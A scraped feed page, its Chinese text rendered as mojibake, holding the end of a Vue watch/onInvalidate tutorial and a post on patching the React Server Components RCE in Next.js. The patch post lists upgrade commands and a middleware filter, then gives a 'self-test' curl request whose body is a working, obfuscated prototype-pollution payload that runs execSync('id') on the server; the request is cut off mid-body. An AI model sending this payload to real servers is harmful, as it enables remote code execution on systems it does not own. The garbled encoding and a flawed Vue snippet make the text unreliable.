<p>è¿™é‡Œæœ‰ä¸€ä¸ªç–‘é—®æ˜¯ï¼š<strong>å½“flushä¸ºpostæ—¶ï¼Œä»£è¡¨è°ƒåº¦å‡½æ•°éœ€è¦å°†å‰¯ä½œç”¨å‡½æ•°æ”¾åˆ°ä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼Œå¹¶ç­‰å¾… DOM æ›´æ–°ç»“æŸåæ‰§è¡Œ ï¼Ÿ</strong></p>
<blockquote>
<p>å¾®ä»»åŠ¡é˜Ÿåˆ—çš„æ‰§è¡Œä¸æ˜¯åœ¨ DOM æ›´æ–°ä¹‹å‰å— ä¸ºä»€ä¹ˆè¿™é‡Œè¯´çš„æ˜¯ ä¹‹åå‘¢ ï¼Ÿ</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source, callback, options = {}) {
   <span class="hljs-comment">//å®šä¹‰getter</span>
   let getter;
   if (typeof source === 'function') {
      getter = source
   } else {
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
      getter = () =&gt; <span class="hljs-built_in">traverse</span>(source)
   }
   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
   let oldValue, newValue
   <span class="hljs-comment">//æå–schedulerè°ƒåº¦å‡½æ•°ä¸ºä¸€ä¸ªç‹¬ç«‹çš„jobå‡½æ•°</span>
   const job = () =&gt; {
      <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
      newValue = <span class="hljs-built_in">effectFn</span>()
      <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
      <span class="hljs-built_in">callback</span>(newValue, oldValue)
      <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
      oldValue = newValue
   }
   <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
   const effectFn = <span class="hljs-built_in">effect</span>(() =&gt; <span class="hljs-built_in">getter</span>(), {
      lazy: true,
      scheduler: ()=&gt;{
         <span class="hljs-comment">//åœ¨è°ƒåº¦å‡½æ•°ä¸­åˆ¤æ–­ flushæ˜¯å¦ä¸º'post'ï¼Œå¦‚æœæ˜¯ï¼Œå°†å…¶æ”¾åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ‰§è¡Œ</span>
               <span class="hljs-built_in">if</span>(options.flush === 'post'){
            const <span class="hljs-selector-tag">p</span> = Promise<span class="hljs-selector-class">.resolve</span>()
                   <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.then</span>(job)
               }else{
            <span class="hljs-built_in">job</span>()
               }
           }
   })
   <span class="hljs-comment">//å½“ immediate ä¸º trueçš„æ—¶å€™ ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
   <span class="hljs-comment">//å¦‚æœä¸æ˜¯ åˆ™æˆ‘ä»¬å°±æ‹¿ä¸€ä¸‹åˆå§‹å€¼å°±å¯ä»¥ã€‚</span>
   if (options.immediate) {
      <span class="hljs-built_in">job</span>()
   } else {
      <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
      <span class="hljs-comment">//è¿™é‡Œçš„å…³é”®æ˜¯ è¿™é‡Œçš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨ å¹¶ä¸ä¼šæ‰§è¡Œ watchçš„å›è°ƒå‡½æ•° æ‰€ä»¥å®ƒæ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</span>
      oldValue = <span class="hljs-built_in">effectFn</span>()
   }
}
</code></pre>
<h2 data-id="heading-30">11-è¿‡æœŸçš„å‰¯ä½œç”¨</h2>
<h3 data-id="heading-31">é—®é¢˜æ‰€åœ¨ï¼šå‰¯ä½œç”¨çš„è¿‡æœŸ</h3>
<p>è¿™ä¸€èŠ‚è®²äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼Œå°±æ˜¯<strong>è¿‡æœŸçš„å‰¯ä½œç”¨ï¼Ÿ</strong></p>
<p>å‰¯ä½œç”¨æ€ä¹ˆä¼šè¿‡æœŸå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-ini" lang="ini">let finalData<span class="hljs-comment">;</span>
watch(obj,async ()=&gt;{
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'///'</span>)
    <span class="hljs-attr">finalData</span> = res
})
</code></pre>
<p>å½“æˆ‘ä»¬çš„ Objä¿®æ”¹çš„æ—¶å€™ï¼Œè§¦å‘äº†å›è°ƒï¼Œæ‰§è¡Œäº† fetch ï¼Œè¿›è¡Œå¼‚æ­¥è°ƒç”¨ã€‚</p>
<p>åœ¨æ‰§è¡Œå¼‚æ­¥æ‰§è¡Œçš„æ—¶å€™ï¼Œæˆ‘ä»¬åˆä¸€æ¬¡è§¦å‘äº†å›è°ƒå‡½æ•°ï¼Œåˆä¸€æ¬¡å‘èµ·äº†å¼‚æ­¥è¯·æ±‚ã€‚</p>
<p>æˆ‘ä»¬çš„çš„ B å…ˆè¿”å›äº†ï¼ŒAåè¿”å›ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ æˆ‘ä»¬åº”è¯¥ä½¿ç”¨B çš„ç»“æœï¼Œè€ŒæŠ›å¼ƒ A çš„ç»“æœï¼Œå› ä¸º A æ˜¯ç¬¬ä¸€æ¬¡çš„æ—¶å€™å‘èµ·çš„ï¼Œåæ¥æˆ‘ä»¬æ›´æ–°äº†</p>
<p>A çš„å‰¯ä½œç”¨å·²ç»è¿‡æœŸäº†ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯é—®é¢˜æ‰€åœ¨ã€‚</p>
<h3 data-id="heading-32">å¦‚ä½•è§£å†³å‘¢ï¼Ÿ</h3>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‚è€ƒVueæä¾›çš„æ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> finalData;
<span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> obj.<span class="hljs-property">foo</span>, <span class="hljs-keyword">async</span> (newValue, oldValue, onInvalidate) =&gt; {
      <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæ ‡è¯†ï¼Œä»£è¡¨å½“å‰å‰¯ä½œç”¨å‡½æ•°æ˜¯å¦è¿‡æœŸï¼Œé»˜è®¤ä¸ºfalse ä»£è¡¨æ²¡æœ‰è¿‡æœŸ</span>
      <span class="hljs-keyword">let</span> expired = <span class="hljs-literal">false</span>
      <span class="hljs-title function_">onInvalidate</span>(<span class="hljs-function">() =&gt;</span> {
         <span class="hljs-comment">//å½“è¿‡æœŸæ—¶ï¼Œå°†expired è®¾ç½®ä¸ºtrue</span>
         expired = <span class="hljs-literal">true</span>
      })
      <span class="hljs-comment">//å‘é€ç½‘ç»œè¯·æ±‚</span>
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/path/to/request'</span>)
      <span class="hljs-keyword">if</span> (!res) {
         finalData = res
      }
   }
)
</code></pre>
<p>å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼š<strong>åœ¨watchå†…éƒ¨æ¯æ¬¡æ£€æŸ¥åˆ°å˜æ›´åï¼Œåœ¨å‰¯ä½œç”¨å‡½æ•°é‡æ–°æ‰§è¡Œä¹‹å‰ï¼Œä¼šå…ˆè°ƒç”¨æˆ‘ä»¬é€šè¿‡onInvalidateå‡½æ•°æ³¨å†Œçš„è¿‡æœŸå›è°ƒã€‚</strong></p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source, callback, options = {}) {
   <span class="hljs-comment">//å®šä¹‰getter</span>
   let getter;
   if (typeof source === 'function') {
      getter = source
   } else {
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
      getter = () =&gt; <span class="hljs-built_in">traverse</span>(source)
   }
   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
   let oldValue, newValue
       <span class="hljs-comment">//cleanup ç”¨æ¥å­˜å‚¨ç”¨æˆ·æ³¨å†Œçš„è¿‡æœŸå›è°ƒ</span>
       let cleanup;
       function <span class="hljs-built_in">onInvalidate</span>(fn){
      cleanup = fn
       }
       
   <span class="hljs-comment">//æå–schedulerè°ƒåº¦å‡½æ•°ä¸ºä¸€ä¸ªç‹¬ç«‹çš„jobå‡½æ•°</span>
   const job = () =&gt; {
      <span class="hljs-comment">//åœ¨è°ƒç”¨å›è°ƒcbä¹‹å‰ï¼Œå…ˆè°ƒç”¨è¿‡æœŸå›è°ƒ</span>
           <span class="hljs-built_in">if</span>(cleanup){
         <span class="hljs-built_in">cleanup</span>()
           }
      <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
      newValue = <span class="hljs-built_in">effectFn</span>()
      <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
      <span class="hljs-built_in">callback</span>(newValue, oldValue,onInvalidate)
      <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
      oldValue = newValue
   }
   <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
   const effectFn = <span class="hljs-built_in">effect</span>(() =&gt; <span class="hljs-built_in">getter</span>(), {
      lazy: true,
      scheduler: () =&gt; {
         <span class="hljs-comment">//åœ¨è°ƒåº¦å‡½æ•°ä¸­åˆ¤æ–­ flushæ˜¯å¦ä¸º'post'ï¼Œå¦‚æœæ˜¯ï¼Œå°†å…¶æ”¾åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ‰§è¡Œ</span>
         if (options.flush === 'post') {
            const <span class="hljs-selector-tag">p</span> = Promise<span class="hljs-selector-class">.resolve</span>()
            <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.then</span>(job)
         } else {
            <span class="hljs-built_in">job</span>()
         }
      }
   })
   <span class="hljs-comment">//å½“ immediate ä¸º trueçš„æ—¶å€™ ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
   <span class="hljs-comment">//å¦‚æœä¸æ˜¯ åˆ™æˆ‘ä»¬å°±æ‹¿ä¸€ä¸‹åˆå§‹å€¼å°±å¯ä»¥ã€‚</span>
   if (options.immediate) {
      <span class="hljs-built_in">job</span>()
   } else {
      <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
      <span class="hljs-comment">//è¿™é‡Œçš„å…³é”®æ˜¯ è¿™é‡Œçš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨ å¹¶ä¸ä¼šæ‰§è¡Œ watchçš„å›è°ƒå‡½æ•° æ‰€ä»¥å®ƒæ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</span>
      oldValue = <span class="hljs-built_in">effectFn</span>()
   }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Reactã€Nextå®‰å…¨æ¼æ´é—®é¢˜ä¿®å¤å’Œè‡ªæµ‹]]></title>    <link>https://juejin.cn/post/7589207843787538467</link>    <guid>https://juejin.cn/post/7589207843787538467</guid>    <pubDate>2025-12-30T02:26:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207843787538467" data-draft-id="7589181008098689039" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Reactã€Nextå®‰å…¨æ¼æ´é—®é¢˜ä¿®å¤å’Œè‡ªæµ‹"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨,Next.js"/> <meta itemprop="datePublished" content="2025-12-30T02:26:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ybc4652"/> <meta itemprop="url" content="https://juejin.cn/user/448256476185582"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Reactã€Nextå®‰å…¨æ¼æ´é—®é¢˜ä¿®å¤å’Œè‡ªæµ‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476185582/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ybc4652
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:26:30.000Z" title="Tue Dec 30 2025 02:26:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®˜æ–¹æ¼æ´</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React æœåŠ¡å™¨ç»„ä»¶ä¸­çš„å…³é”®å®‰å…¨æ¼æ´</a></p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆ</h2>
<p>é€šè¿‡å‡çº§ç‰ˆæœ¬å’Œé¡¹ç›®æœ¬èº«è¿›è¡Œä¿®å¤</p>
<p><strong>æ ¹æ®å®˜æ–¹è¦æ±‚å‡çº§åº“ç‰ˆæœ¬</strong></p>
<p>ä¸‹é¢åˆ—ä¸¾nextjsçš„éƒ¨åˆ†ï¼Œæ›´å¤šå‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a></p>
<pre><code class="hljs language-bash" lang="bash">npm install next@14.2.35 // <span class="hljs-keyword">for</span> 13.3.x, 13.4.x, 13.5.x, 14.x  
npm install next@15.0.7 // <span class="hljs-keyword">for</span> 15.0.x  
npm install next@15.1.11 // <span class="hljs-keyword">for</span> 15.1.x  
npm install next@15.2.8 // <span class="hljs-keyword">for</span> 15.2.x  
npm install next@15.3.8 // <span class="hljs-keyword">for</span> 15.3.x  
npm install next@15.4.10 // <span class="hljs-keyword">for</span> 15.4.x  
npm install next@15.5.9 // <span class="hljs-keyword">for</span> 15.5.x  
npm install next@16.0.10 // <span class="hljs-keyword">for</span> 16.0.x
</code></pre>
<p><strong>é¡¹ç›®æœ¬èº«è¿›è¡Œæ‹¦æˆª</strong></p>
<p>ä¿®æ”¹ nexté¡¹ç›®çš„ <code>middleware.ts</code> æ–‡ä»¶è¿›è¡Œæ‹¦æˆª</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>;

<span class="hljs-comment">// éªŒè¯ Referer æ˜¯å¦ä¸ºåˆæ³•æ¥æºï¼ˆè½»é‡çº§å®ç°ï¼Œé¿å…åˆ›å»º URL å¯¹è±¡ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidReferer</span>(<span class="hljs-params">referer: <span class="hljs-built_in">string</span>, origin: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œé¿å…åˆ›å»º URL å¯¹è±¡å¸¦æ¥çš„å†…å­˜å¼€é”€</span>
  <span class="hljs-keyword">return</span> referer.<span class="hljs-title function_">startsWith</span>(origin) || referer.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`<span class="hljs-subst">${origin}</span>/`</span>);
}


<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-keyword">const</span> { pathname } = request.<span class="hljs-property">nextUrl</span>;
    
    <span class="hljs-comment">// å…ˆå¿«é€Ÿè¿‡æ»¤é™æ€èµ„æºå’ŒAPIè¯·æ±‚ï¼Œé¿å…ä¸å¿…è¦çš„å®‰å…¨æ£€æŸ¥å¼€é”€</span>
    <span class="hljs-keyword">if</span> (pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/_next'</span>) || pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/favicon.ico'</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
    }

    <span class="hljs-comment">// å®‰å…¨æ£€æŸ¥: é˜²æ­¢ Next.js Server Actions RCE æ¼æ´</span>
    <span class="hljs-comment">// åªå¯¹å¸¦æœ‰ Next-Action å¤´çš„è¯·æ±‚è¿›è¡Œæ£€æŸ¥ï¼Œé¿å…å½±å“æ­£å¸¸é¡µé¢è¯·æ±‚æ€§èƒ½</span>
    <span class="hljs-keyword">const</span> nextActionHeader = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Next-Action'</span>);
    <span class="hljs-keyword">if</span> (nextActionHeader) {
        <span class="hljs-keyword">const</span> contentType = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Content-Type'</span>);

        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºå¼‚å¸¸çš„ multipart/form-data è¯·æ±‚ï¼ˆä¸»è¦æ”»å‡»å‘é‡ï¼‰</span>
        <span class="hljs-keyword">if</span> (contentType?.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'multipart/form-data'</span>)) {
            <span class="hljs-keyword">const</span> referer = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Referer'</span>);

        <span class="hljs-comment">// éªŒè¯ Referer æ¥æºï¼Œé˜²æ­¢è·¨ç«™æ”»å‡»ï¼ˆç§»é™¤æ—¥å¿—é¿å…å†…å­˜é—®é¢˜ï¼‰</span>
        <span class="hljs-keyword">if</span> (!referer || !<span class="hljs-title function_">isValidReferer</span>(referer, request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">origin</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NextResponse</span>(<span class="hljs-string">'Forbidden'</span>, { <span class="hljs-attr">status</span>: <span class="hljs-number">403</span> });
          }
        }
    }
    
    <span class="hljs-comment">// åé¢ç»§ç»­æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
    ...
}

</code></pre>
<h2 data-id="heading-2">è‡ªæµ‹å‘½ä»¤</h2>
<blockquote>
<p>æ³¨æ„ï¼šå°†å…¶ä¸­çš„ <code>localhost:3000</code> æ›¿æ¢ä¸ºè‡ªå·±æœ¬åœ°åœ°å€</p>
</blockquote>
<p>æ–¹æ³•ä¸€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl --path-as-is -i -s -k -X $<span class="hljs-string">'POST'</span> \
    -H $<span class="hljs-string">'Host: localhost:3000'</span> -H $<span class="hljs-string">'Upgrade-Insecure-Requests: 1'</span> -H $<span class="hljs-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'</span> -H $<span class="hljs-string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> -H $<span class="hljs-string">'Accept-Encoding: gzip, deflate'</span> -H $<span class="hljs-string">'Accept-Language: zh-TW,zh;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6'</span> -H $<span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Originating-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Addr: 127.0.0.1'</span> -H $<span class="hljs-string">'Next-Action: x'</span> -H $<span class="hljs-string">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFnJiYNZt'</span> -H $<span class="hljs-string">'Content-Length: 1158'</span> \
    --data-binary $<span class="hljs-string">'------WebKitFormBoundaryFnJiYNZt\x0d\x0aContent-Disposition: form-data; name=\"0\"\x0d\x0a\x0d\x0a{\x09\"a\":\"c\",\x0d\x0a  \"then\":\"$1:__proto__:then\",\x0d\x0a  \"status\":\"resolved_model\",\x0d\x0a  \"reason\":-1,\x0d\x0a  \"value\":\"{\\\"then\\\":\\\"$B\\\"}\",\x0d\x0a  \"_response\":{\x0d\x0a    \"_prefix\":\"var _0x2adb=[\'</span>\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\<span class="hljs-string">',\'</span>\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\<span class="hljs-string">',\'</span>\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\<span class="hljs-string">'];var _0x54ea=function(_0x2adb82,_0x54ea8e){_0x2adb82=_0x2adb82-0x0;var _0x1ed852=_0x2adb[_0x2adb82];return _0x1ed852;};var res=process[_0x54ea(\'</span>0x1\<span class="hljs-string">')][\'</span>require\<span class="hljs-string">'](_0x54ea(\'</span>0x0\<span class="hljs-string">'))[\'</span>execSync\<span class="hljs-string">'](\'</span><span class="hljs-built_in">id</span>\<span class="hljs-string">')[_0x54ea(\'</span>0x2\<span class="hljs-string">')]()[\'</span>trim\<span class="hljs-string">']();var _0x3236=[\'</span>assign\<span class="hljs-string">'];var _0x58c8=function(_0x3236f2,_0x58c8b7){_0x3236f2=_0x3236f2-0x0;var _0x22ddc4=_0x3236[_0x3236f2];return _0x22ddc4;};throw Object[_0x58c8(\'</span>0x0\<span class="hljs-string">')](new Error(\'</span>a\<span class="hljs-string">'),{\'</span>digest\<span class="hljs-string">':\'</span>\<span class="hljs-string">'+res});\",\x0d\x0a    \"_chunks\":\"$Q2\",\x0d\x0a    \"_formData\":{\"get\":\"$1:constructor:constructor\"}\x0d\x0a  }\x0d\x0a}\x0d\x0a\x0d\x0a------WebKitFormBoundaryFnJiYNZt\x0d\x0aContent-Disposition: form-data; name=\"1\"\x0d\x0a\x0d\x0a\"$@0\"\x0d\x0a------WebKitFormBoundaryFnJiYNZt\x0d\x0aContent-Disposition: form-data; 